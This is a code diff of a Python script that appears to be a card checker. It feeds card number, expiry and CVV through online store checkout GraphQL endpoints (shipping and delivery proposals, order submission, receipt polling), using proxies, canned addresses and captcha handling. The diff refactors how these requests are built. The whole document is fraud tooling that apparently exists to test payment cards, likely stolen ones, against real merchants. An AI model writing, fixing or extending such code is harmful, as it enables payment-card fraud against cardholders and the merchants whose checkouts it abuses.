@@ -207,7 +207,6 @@ DEFAULT_ADDRESS = ADDRESSES['US']
 def get_address_for_country(country_code):
     return ADDRESSES.get(country_code.upper(), DEFAULT_ADDRESS)
 
-# Currency to country mapping (used by pick_addr fallback)
 C2C = {
     "USD": "US",
     "CAD": "CA", 
@@ -307,6 +306,11 @@ def extract_clean_response(message):
         return words[0]
     return message[:50]
 
+def get_operation_name(query_str):
+    """Extract operation name from GraphQL query or mutation."""
+    match = re.search(r'^\s*(?:mutation|query)\s+(\w+)', query_str)
+    return match.group(1) if match else None
+
 # ==================== ORIGINAL ASYNC PRODUCT FETCH ====================
 async def fetch_products(domain, proxy_str=None):
     try:
@@ -369,7 +373,13 @@ async def fetch_products(domain, proxy_str=None):
         return False, f"error: {str(e)}"
 
 # ==================== ASYNC CARD PROCESSING ====================
-async def make_graphql_request_with_captcha_handling(session, url, params, headers, json_data, checkout_url, max_retries=1):
+async def make_graphql_request_with_captcha_handling(session, url, query, variables, headers, checkout_url, max_retries=1):
+    op_name = get_operation_name(query)
+    params = {'operationName': op_name} if op_name else {}
+    json_data = {'query': query, 'variables': variables}
+    if op_name:
+        json_data['operationName'] = op_name
+
     for attempt in range(max_retries+1):
         try:
             resp = await session.post(url, params=params, headers=headers, json=json_data)
@@ -492,7 +502,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
             # ================== GRAPHQL PROPOSAL 1 (SHIPPING) ==================
             graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'
-            params = {'operationName': 'Proposal'}
             proposal_data = {
                 'query': QUERY_PROPOSAL_SHIPPING,
                 'variables': {
@@ -582,13 +591,12 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         'shippingScriptChanges': []
                     },
                     'optionalDuties': {'buyerRefusesDuties': False}
-                },
-                'operationName': 'Proposal'
+                }
             }
 
             # Send first proposal
             resp1, text1, captcha1 = await make_graphql_request_with_captcha_handling(
-                session, graphql_url, params, headers, proposal_data, checkout_url
+                session, graphql_url, QUERY_PROPOSAL_SHIPPING, proposal_data['variables'], headers, checkout_url
             )
             if not resp1:
                 return False, f"Proposal request failed: {text1}", gateway, total_price, currency
@@ -651,23 +659,22 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 return False, f"Proposal parse error: {e}", gateway, total_price, currency
 
             # ================== GRAPHQL PROPOSAL 2 (DELIVERY) ==================
-            proposal2_data = proposal_data.copy()
-            proposal2_data['query'] = QUERY_PROPOSAL_DELIVERY
-            proposal2_data['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
+            proposal2_vars = proposal_data['variables'].copy()
+            proposal2_vars['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
                 'deliveryStrategyByHandle': {
                     'handle': delivery_strategy if delivery_strategy else '',
                     'customDeliveryRate': False
                 },
                 'options': {}
             }
-            proposal2_data['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {
+            proposal2_vars['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {
                 'lines': [{'stableId': stableId or '1'}]
             }
-            proposal2_data['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {
+            proposal2_vars['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {
                 'value': {'amount': str(shipping_amount), 'currencyCode': currency}
             }
-            proposal2_data['variables']['delivery']['deliveryLines'][0]['destinationChanged'] = False
-            proposal2_data['variables']['payment']['billingAddress'] = {
+            proposal2_vars['delivery']['deliveryLines'][0]['destinationChanged'] = False
+            proposal2_vars['payment']['billingAddress'] = {
                 'streetAddress': {
                     'address1': street, 'address2': address2, 'city': city,
                     'countryCode': country_code, 'postalCode': s_zip,
@@ -675,11 +682,11 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     'zoneCode': state, 'phone': phone
                 }
             }
-            proposal2_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
-            proposal2_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone
+            proposal2_vars['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
+            proposal2_vars['buyerIdentity']['shopPayOptInPhone']['number'] = phone
 
             resp2, text2, captcha2 = await make_graphql_request_with_captcha_handling(
-                session, graphql_url, params, headers, proposal2_data, checkout_url
+                session, graphql_url, QUERY_PROPOSAL_DELIVERY, proposal2_vars, headers, checkout_url
             )
             if not resp2:
                 return False, f"Delivery proposal failed: {text2}", gateway, total_price, currency
@@ -834,13 +841,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if checkpoint_data:
                 submit_vars['input']['checkpointData'] = checkpoint_data
 
-            submit_data = {
-                'query': MUTATION_SUBMIT,
-                'variables': submit_vars,
-                'operationName': 'SubmitForCompletion'
-            }
             resp3, text3, captcha3 = await make_graphql_request_with_captcha_handling(
-                session, graphql_url, params, headers, submit_data, checkout_url
+                session, graphql_url, MUTATION_SUBMIT, submit_vars, headers, checkout_url
             )
             if not resp3:
                 return False, f"Submit failed: {text3}", gateway, total_price, currency
@@ -850,7 +852,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             # Parse submit response
             try:
                 submit_json = json.loads(text3)
-                # Check for GraphQL errors first
                 if 'errors' in submit_json:
                     errors = submit_json['errors']
                     err_msgs = [e.get('message', str(e)) for e in errors[:3]]
@@ -858,9 +859,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
                 submit_result = submit_json.get('data', {}).get('submitForCompletion', {})
                 if not submit_result:
-                    # If no data and no errors, maybe the mutation doesn't exist or gateway is not supported
-                    # Try to get the receipt from the response if it exists elsewhere (rare)
-                    # Otherwise, return a clear error
                     return False, "Empty submit response – gateway may not support this mutation", gateway, total_price, currency
 
                 typename = submit_result.get('__typename')
@@ -890,15 +888,11 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     return False, f"Unknown submit result: {typename}", gateway, total_price, currency
 
                 # Poll for receipt
-                poll_data = {
-                    'query': QUERY_POLL,
-                    'variables': {'receiptId': rid, 'sessionToken': sst},
-                    'operationName': 'PollForReceipt'
-                }
+                poll_vars = {'receiptId': rid, 'sessionToken': sst}
                 for _ in range(6):
                     await asyncio.sleep(3)
                     resp4, text4, captcha4 = await make_graphql_request_with_captcha_handling(
-                        session, graphql_url, params, headers, poll_data, checkout_url
+                        session, graphql_url, QUERY_POLL, poll_vars, headers, checkout_url
                     )
                     if is_captcha_required(text4):
                         return True, "CARD_DECLINED", gateway, total_price, currency
